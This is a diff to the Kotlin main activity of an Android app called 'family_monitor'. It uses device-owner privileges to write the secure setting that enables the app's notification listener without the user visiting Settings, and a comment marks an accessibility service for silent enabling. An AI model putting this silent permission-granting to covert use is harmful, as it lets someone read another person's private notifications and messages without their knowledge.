@@ -1,7 +1,6 @@
 package com.example.family_monitor
 
 import android.app.Activity
-import android.app.NotificationManager
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Intent
@@ -131,14 +130,18 @@ class MainActivity : FlutterActivity() {
         if (!dpm.isDeviceOwnerApp(packageName)) return
 
         // 1. Enable NotificationListenerService without user going to Settings
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            try {
-                val nm = getSystemService(NotificationManager::class.java)
-                nm?.setNotificationListenerAccessGranted(
-                    ComponentName(this, ScreenNotificationListener::class.java),
-                    true)
-            } catch (_: Exception) {}
-        }
+        //    setNotificationListenerAccessGranted is @SystemApi (not public SDK).
+        //    Device-owner can write enabled_notification_listeners via setSecureSetting.
+        try {
+            val svcFlat = ComponentName(this, ScreenNotificationListener::class.java)
+                .flattenToString()
+            val current = android.provider.Settings.Secure.getString(
+                contentResolver, "enabled_notification_listeners") ?: ""
+            if (!current.split(":").contains(svcFlat)) {
+                val updated = if (current.isEmpty()) svcFlat else "$current:$svcFlat"
+                dpm.setSecureSetting(admin, "enabled_notification_listeners", updated)
+            }
+        } catch (_: Exception) {}
 
         // 2. Enable AccessibilityService silently via secure setting
         try {
